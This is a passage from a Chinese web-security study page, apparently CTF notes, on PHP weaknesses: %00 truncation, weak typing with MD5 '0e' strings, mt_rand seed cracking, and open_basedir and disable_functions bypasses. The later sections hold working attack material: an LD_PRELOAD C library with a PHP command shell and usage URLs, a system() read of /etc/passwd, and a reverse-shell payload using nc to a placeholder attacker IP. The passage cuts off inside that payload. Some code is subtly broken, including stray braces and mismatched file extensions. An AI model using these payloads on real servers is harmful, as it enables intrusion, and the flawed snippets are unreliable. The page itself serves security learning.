</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>如果确实要显示错误信息，一定要设置显示错误信息的级别。</p> <p>例如，只显示警告以上的错误信息：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>error_reporting <span class="token operator">=</span> <span class="token constant">E_WARNING</span> <span class="token operator">&amp;</span> <span class="token constant">E_ERROR</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="错误日志"><strong>错误日志</strong> <a href="#错误日志" class="header-anchor">#</a></h3> <p>建议在关闭错误提示信息后，对于错误信息进行记录，便于排查服务器运行异常的原因：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>log_errors <span class="token operator">=</span> On
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>同时，需要设置错误日志存放的目录，将 PHP 错误日志与 Apache 的日志存放在同一目录下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>error_log = /usr/local/apache2/logs/php_error.log
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>注意</strong>： 该文件必须设置允许 Apache 用户或用户组具有写的权限。</p> <h1 id="php的-00-截断的原理是什么">PHP的 %00 截断的原理是什么？ <a href="#php的-00-截断的原理是什么" class="header-anchor">#</a></h1> <p><strong><code>存在于 &lt; 5.3.4版本</code>，GPC关闭</strong>，一般利用在对文件进行操作时，如文件上传时文件名的截断</p> <p>如<code>filename=test.php%00.txt</code> 会被截断成test.php，00后面的被忽略</p> <p>系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了</p> <blockquote><p>因为PHP使用C语言编写，C语言的字符串结束标志是字符 <code>\0</code> ，它的ASCII码值是 0</p></blockquote> <h1 id="php弱类型">PHP弱类型 <a href="#php弱类型" class="header-anchor">#</a></h1> <p>如果用<code>==</code>比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p> <p><code>0e</code>开头的字符串等于0</p> <p>进行比较运算时，如果遇到了<code>0e\d+</code>这种字符串，就会将这种字符串解析为科学计数法</p> <p><strong>0e开头的MD5和原字符串（用于MD5碰撞）</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code>?kekeyy1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>xxx<span class="token operator">&amp;</span>kekeyy2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL</p> <p>所以两个数组经过加密后得到的都是NULL,也就是相等的</p> <p><strong>值为NULL的MD5：</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>**strcmp()：**需要给strcmp()传递2个string类型的参数</p> <blockquote><p>如果str1小于str2,返回-1，相等返回0，否则返回1</p> <p>strcmp比较出错 =&gt; 返回NULL =&gt; NULL==0 =&gt; get flag!</p></blockquote> <h1 id="变量覆盖">变量覆盖 <a href="#变量覆盖" class="header-anchor">#</a></h1> <p><strong>$$容易引发变量覆盖</strong></p> <blockquote><p>$GLOBALS — 引用全局作用域中可用的全部变量		(PHP手册)</p></blockquote> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$args</span><span class="token operator">=</span><span class="token constant">GLOBALS</span> 和 <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$args</span><span class="token punctuation">)</span> 前面那个 $ 组成 <span class="token variable">$GLOBALS</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h1 id="php伪随机数爆破">PHP伪随机数爆破 <a href="#php伪随机数爆破" class="header-anchor">#</a></h1> <blockquote><p>每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种</p> <p>PHP的mt_rand()函数生成的随机数只跟seed和调用该函数的次数有关。</p></blockquote> <p>当得到seed数值后，就可以预测出接下来的数值是多少，这是该函数的一个问题，它并不能起到一个真随机数的作用</p> <p>seed获取需要利用一个爆破工具：<a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener noreferrer">https<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener noreferrer">😕/github.com/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener noreferrer">lepiaf<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener noreferrer">/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener noreferrer">php_mt_seed<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="例题">例题： <a href="#例题" class="header-anchor">#</a></h2> <p>把题目给的生成的一组随机数的第一个数用作爆破</p> <p>可能爆破出来多个种子，自己本地测试下</p> <p>题目：srand.php</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;PHP 7.x&quot;</span><span class="token punctuation">;</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span>xxxxxxxx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token shell-comment comment"># We can't tell you what is xxxxxxxx!</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;echo flag{&quot;</span><span class="token punctuation">.</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;}&quot;</span>
<span class="token delimiter important">?&gt;</span></span>
984489752
619387123
2070958802
2105559368
1909473866
1679323715
1910332168
640569646
1103001695
1871111424
flag

So, Please guess the flag!
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code>./php_mt_seed <span class="token number">984489752</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h1 id="绕过open-basedir列目录">绕过Open_basedir列目录 <a href="#绕过open-basedir列目录" class="header-anchor">#</a></h1> <h3 id="_1、system命令执行函数绕过">1、system命令执行函数绕过 <a href="#_1、system命令执行函数绕过" class="header-anchor">#</a></h3> <blockquote><p>open_basedir 的设置对system等命令执行函数是无效的，所以可以用命令执行函数来访问限制目录</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>system<span class="token punctuation">(</span><span class="token string">&quot;cat ../../../../../etc/passwd&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>但是命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制</p> <h3 id="_2、glob-数据流包装器">2、glob:// 数据流包装器 <a href="#_2、glob-数据流包装器" class="header-anchor">#</a></h3> <blockquote><p>glob是用来筛选目录的伪协议，筛选时不受<code>open_basedir</code>制约</p></blockquote> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;glob:///var/www/html/*.php&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean constant">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;filename:&quot;</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;\n&quot;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>更多方法参见<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener noreferrer">P牛的博客<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h1 id="绕过disable-fuction">绕过disable_fuction <a href="#绕过disable-fuction" class="header-anchor">#</a></h1> <h3 id="利用dl-函数"><strong>利用DL()函数</strong> <a href="#利用dl-函数" class="header-anchor">#</a></h3> <p>dl( ) 函数允许在php脚本里动态加载php模块，默认是加载extension_dir目录里的扩展</p> <p>该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。</p> <p>也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的</p> <p>可以用<code>../</code>这种目录遍历的方式指定加载任何一个目录里的so等扩展文件</p> <p>所以我们可以上传自己的so文件，并且用dl函数加载这个so文件执行命令</p> <h3 id="ld-preload-环境变量"><strong>LD_PRELOAD 环境变量</strong> <a href="#ld-preload-环境变量" class="header-anchor">#</a></h3> <p>LD_PRELOAD 是Linux的环境变量，它允许定义在程序运行前优先加载的动态链接库</p> <p>在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件</p> <p>so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">//bypass_disablefuc.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">_GNU_SOURCE</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span>
<span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">&quot;EVIL_CMDLINE&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">&quot;LD_PRELOAD&quot;</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">&quot;LD_PRELOAD&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//编译成动态链接库</span>
gcc <span class="token operator">-</span>shared <span class="token operator">-</span>fPIC bypass_disablefuc<span class="token punctuation">.</span>c <span class="token operator">-</span>o bypass_disablefunc_x64<span class="token punctuation">.</span>so
    
<span class="token comment">//若目标为 x86 架构，需要加上 -m32</span>
gcc <span class="token operator">-</span>shared <span class="token operator">-</span>fPIC bypass_disablefuc<span class="token punctuation">.</span>c <span class="token operator">-</span>m32 <span class="token operator">-</span>o bypass_disablefunc_x32<span class="token punctuation">.</span>so
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>再写一个PHP， 用putenv添加环境变量(一个是上传的so库地址、一个是要执行的命令)。</p> <p>将system命令输出内容写入指定文件，然后读出。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//bypass_disablefunc.php 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 	<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span><span class="token punctuation">;</span>

	<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;cmd&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;outpath&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot; &gt; &quot;</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot; 2&gt;&amp;1&quot;</span><span class="token punctuation">;</span>
   <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
   <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;EVIL_CMDLINE=&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;sopath&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;LD_PRELOAD=&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">mail</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
	<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>将编译成的<strong>动态链接库</strong>和<strong>php文件</strong>上传到目标网站根目录。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment">#用法如下</span>
http://xx.com/bypass_disablefunc.php?cmd<span class="token operator">=</span>ls<span class="token operator">&amp;</span><span class="token assign-left variable">outpath</span><span class="token operator">=</span>/tmp/ss<span class="token operator">&amp;</span><span class="token assign-left variable">sopath</span><span class="token operator">=</span>/var/www/html/bypass_disablefunc_x64.so
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote><p>PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail。 (<strong>此方法还可用于过WAF</strong>)</p></blockquote> <h3 id="fastcgi-php-fpm"><strong>Fastcgi/PHP-FPM</strong> <a href="#fastcgi-php-fpm" class="header-anchor">#</a></h3> <p>Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；</p> <p>PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现</p> <p>Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量</p> <p><a href="https://github.com/AntSwordProject/ant_php_extension" target="_blank" rel="noopener noreferrer">蚁剑扩展<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，用相应版本php编译即可</p> <h3 id="apache-mod-cgi"><strong>Apache Mod CGI</strong> <a href="#apache-mod-cgi" class="header-anchor">#</a></h3> <p>Mod CGI就是把PHP做为APACHE一个内置模块，</p> <p>让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP</p> <p>它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行</p> <p>在phpinfo看到<code>Server API -&gt; CGI/FastCGI</code>，就可以确定是以cgi模式运行的了。</p> <p><strong>要求</strong></p> <blockquote><ol><li>apache且运行mod_cgi模式</li> <li>web目录可写</li> <li>允许.htaccess生效</li></ol></blockquote> <p>在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>Options +ExecCGI
AddHandler cgi-script .dizzle
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>现成payload - 》反弹shell：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;nc -c '/bin/bash' 攻击者IP 6666&quot;</span><span class="token punctuation">;</span> <span class="token comment">//command to be executed</span>
<span class="token variable">$shellfile</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;#!/bin/bash\n&quot;</span><span class="token punctuation">;</span> <span class="token comment">//using a shellscript</span>
<span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span><span class="token punctuation">;</span> <span class="token comment">//header is needed, otherwise a 500 error is thrown when there is output</span>
<span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">&quot;<span class="token interpolation"><span class="token variable">$cmd</span></span>&quot;</span><span class="token punctuation">;</span> <span class="token comment">//executing $cmd</span>
<span class="token keyword">function</span> <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token variable">$condition</span><span class="token punctuation">,</span><span class="token variable">$yes</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token comment">//this surely can be shorter</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;<span class="token interpolation"><span class="token variable">$text</span></span>: &quot;</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$condition</span> <span class="token operator">?</span> <span class="token variable">$yes</span> <span class="token punctuation">:</span> <span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;&lt;br&gt;\n&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'checked'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.htaccess'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;\nSetEnv HTACCESS on&quot;</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>
